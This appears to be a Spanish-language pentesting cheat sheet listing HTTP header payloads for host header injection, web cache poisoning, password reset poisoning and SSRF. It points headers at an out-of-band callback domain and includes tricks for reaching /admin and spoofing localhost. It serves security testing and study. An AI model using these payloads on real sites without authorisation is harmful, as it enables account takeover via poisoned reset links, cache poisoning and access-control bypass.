# Formas de representar / inyectar el Host

> Para host header injection, web cache poisoning, password reset poisoning y SSRF. Probá una por una apuntando a tu Collaborator/exploit server.

```
Host: OASTIFY.com
X-Forwarded-Host: OASTIFY.com
X-Host: OASTIFY.com
X-Forwarded-Server: OASTIFY.com
X-HTTP-Host-Override: OASTIFY.com
X-Original-Host: OASTIFY.com
Forwarded: host=OASTIFY.com
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Forwarded-Scheme: http
X-Forwarded-Proto: http
Host: victima.com:OASTIFY.com
Host: victima.com:1337
```

Otras variantes: `Host` duplicado (uno con la víctima y otro con tu dominio), `Host` indentado con un espacio al inicio, y host absoluto en la request-line (`GET https://victima.com/ HTTP/1.1` con `Host` distinto).

## 🔗 [[../../vulnerabilities/016-host-header-injection/host-header|Host Header]] · [[../../vulnerabilities/030-web-cache-poisoning/web-cache-poisoning|Web Cache Poisoning]]
